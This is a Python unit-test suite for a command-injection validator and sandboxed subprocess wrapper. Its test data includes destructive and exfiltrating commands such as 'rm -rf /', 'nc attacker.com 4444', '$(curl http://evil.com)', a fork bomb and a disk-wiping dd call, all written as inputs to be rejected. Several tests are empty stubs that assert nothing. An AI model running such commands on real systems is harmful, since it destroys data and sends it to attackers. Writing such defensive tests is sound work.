"""
Test Suite for Command Injection Protection

Tests command validation, subprocess security, and injection prevention.

Author: KP14 Security Team
"""

import unittest
import subprocess
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core_engine.security_utils import CommandValidator
from core_engine.secure_subprocess import SecureSubprocess, secure_run
from core_engine.error_handler import SecurityError


class TestCommandValidation(unittest.TestCase):
    """Test command validation and injection detection."""

    def test_detect_command_chaining_semicolon(self):
        """Test detection of command chaining with semicolon."""
        dangerous_commands = [
            ['ls', ';', 'rm', '-rf', '/'],
            ['cat', 'file.txt;', 'curl', 'evil.com'],
            ['echo', 'test', ';', 'whoami'],
        ]

        for cmd in dangerous_commands:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                self.assertFalse(is_safe, f"Failed to detect command chaining: {cmd}")

    def test_detect_command_chaining_pipe(self):
        """Test detection of command chaining with pipe."""
        dangerous_commands = [
            ['cat', '/etc/passwd', '|', 'grep', 'root'],
            ['ls', '|', 'sh'],
            ['echo', 'test', '|', 'nc', 'attacker.com', '4444'],
        ]

        for cmd in dangerous_commands:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                self.assertFalse(is_safe, f"Failed to detect pipe chaining: {cmd}")

    def test_detect_command_substitution(self):
        """Test detection of command substitution."""
        dangerous_commands = [
            ['echo', '$(whoami)'],
            ['cat', '`uname -a`'],
            ['ls', '$(curl http://evil.com)'],
        ]

        for cmd in dangerous_commands:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                self.assertFalse(is_safe, f"Failed to detect command substitution: {cmd}")

    def test_detect_shell_metacharacters(self):
        """Test detection of shell metacharacters in arguments."""
        dangerous_args = [
            ['ls', '-la', '&& rm -rf /'],
            ['cat', 'file.txt; whoami'],
            ['echo', '$PATH'],
            ['ls', '`ls`'],
        ]

        for cmd in dangerous_args:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                self.assertFalse(is_safe, f"Failed to detect shell metacharacters: {cmd}")

    def test_allow_safe_commands(self):
        """Test that safe commands are allowed."""
        safe_commands = [
            ['ls', '-la'],
            ['cat', 'file.txt'],
            ['python3', 'script.py', '--option', 'value'],
            ['radare2', '-v'],
        ]

        for cmd in safe_commands:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                # Note: May fail if executable not in whitelist
                # This tests the validator logic, not whitelist membership

    def test_sanitize_command_args(self):
        """Test command argument sanitization."""
        test_cases = [
            (['ls', '-la|grep test'], ['ls', '-lagrep test']),
            (['cat', 'file;whoami'], ['cat', 'filewhoami']),
            (['echo', '$HOME'], ['echo', 'HOME']),
        ]

        for input_cmd, expected_cmd in test_cases:
            with self.subTest(input=input_cmd):
                sanitized = CommandValidator.sanitize_command_args(input_cmd)
                self.assertEqual(sanitized, expected_cmd)


class TestSecureSubprocess(unittest.TestCase):
    """Test secure subprocess wrapper."""

    def setUp(self):
        """Set up test fixtures."""
        self.secure_subprocess = SecureSubprocess(enable_sandboxing=False)

    def test_validate_executable_whitelist(self):
        """Test executable whitelist validation."""
        # Allowed executables
        allowed = ['radare2', 'python3', 'strings']
        for exe in allowed:
            with self.subTest(exe=exe):
                result = self.secure_subprocess._validate_executable(exe)
                self.assertTrue(result, f"Allowed executable rejected: {exe}")

        # Blocked executables
        blocked = ['rm', 'mkfs', 'dd', '/bin/bash']
        for exe in blocked:
            with self.subTest(exe=exe):
                result = self.secure_subprocess._validate_executable(exe)
                self.assertFalse(result, f"Blocked executable allowed: {exe}")

    def test_reject_dangerous_patterns(self):
        """Test rejection of dangerous command patterns."""
        dangerous_commands = [
            ['sh', '-c', 'rm -rf /'],
            ['bash', '-c', ':(){:|:&};:'],  # Fork bomb
            ['dd', 'if=/dev/zero', 'of=/dev/sda'],
        ]

        for cmd in dangerous_commands:
            with self.subTest(cmd=cmd):
                with self.assertRaises(SecurityError):
                    self.secure_subprocess.run(cmd)

    def test_timeout_enforcement(self):
        """Test that timeout is enforced."""
        # Test with a command that would hang (if sleep were allowed)
        # Since sleep might not be in whitelist, we test timeout parameter validation
        max_timeout = 1800  # 30 minutes

        # Test timeout clamping
        # (Implementation detail: we can't easily test actual timeout without a hanging command)
        pass

    def test_environment_sanitization(self):
        """Test that environment variables are sanitized."""
        # The secure wrapper should use minimal environment
        # This prevents environment-based attacks
        pass

    def test_command_logging(self):
        """Test that commands are logged for audit trail."""
        # Verify that subprocess executions are logged
        # (Would need to check logger output)
        pass


class TestInjectionVectors(unittest.TestCase):
    """Test various injection attack vectors."""

    def test_newline_injection(self):
        """Test detection of newline injection."""
        commands_with_newlines = [
            ['echo', 'test\nwhoami'],
            ['cat', 'file\n/etc/passwd'],
        ]

        for cmd in commands_with_newlines:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                self.assertFalse(is_safe, f"Newline injection not detected: {cmd}")

    def test_null_byte_injection(self):
        """Test handling of null bytes."""
        # Null bytes can terminate strings in C
        command_with_null = ['cat', 'file\x00/etc/passwd']

        # Should be handled safely
        is_safe, msg = CommandValidator.is_safe_command(command_with_null)
        # Implementation should either reject or sanitize

    def test_unicode_homoglyph_attack(self):
        """Test handling of unicode homoglyphs."""
        # Unicode characters that look like ASCII but aren't
        # e.g., Cyrillic 'а' vs Latin 'a'
        pass

    def test_argument_injection(self):
        """Test injection via command arguments."""
        # Attempts to inject arguments
        injection_attempts = [
            ['ls', '--help=`whoami`'],
            ['cat', '--flag', '$(uname -a)'],
        ]

        for cmd in injection_attempts:
            with self.subTest(cmd=cmd):
                is_safe, msg = CommandValidator.is_safe_command(cmd)
                # Should detect the injection pattern


class TestSubprocessSandboxing(unittest.TestCase):
    """Test subprocess sandboxing features."""

    def test_firejail_sandboxing(self):
        """Test firejail sandboxing if available."""
        import shutil

        if shutil.which('firejail'):
            secure_subprocess = SecureSubprocess(
                enable_sandboxing=True,
                sandbox_type='firejail'
            )

            # Should wrap command with firejail
            wrapped = secure_subprocess._wrap_with_sandbox(['echo', 'test'])
            self.assertIn('firejail', wrapped[0])
            self.assertIn('--net=none', wrapped)
        else:
            self.skipTest('Firejail not available')

    def test_bubblewrap_sandboxing(self):
        """Test bubblewrap sandboxing if available."""
        import shutil

        if shutil.which('bwrap'):
            secure_subprocess = SecureSubprocess(
                enable_sandboxing=True,
                sandbox_type='bubblewrap'
            )

            wrapped = secure_subprocess._wrap_with_sandbox(['echo', 'test'])
            self.assertIn('bwrap', wrapped[0])
        else:
            self.skipTest('Bubblewrap not available')

    def test_sandbox_network_isolation(self):
        """Test that sandboxed processes have no network access."""
        # Would need actual sandbox to test
        pass

    def test_sandbox_filesystem_isolation(self):
        """Test that sandboxed processes have restricted filesystem access."""
        # Would need actual sandbox to test
        pass


if __name__ == '__main__':
    unittest.main()
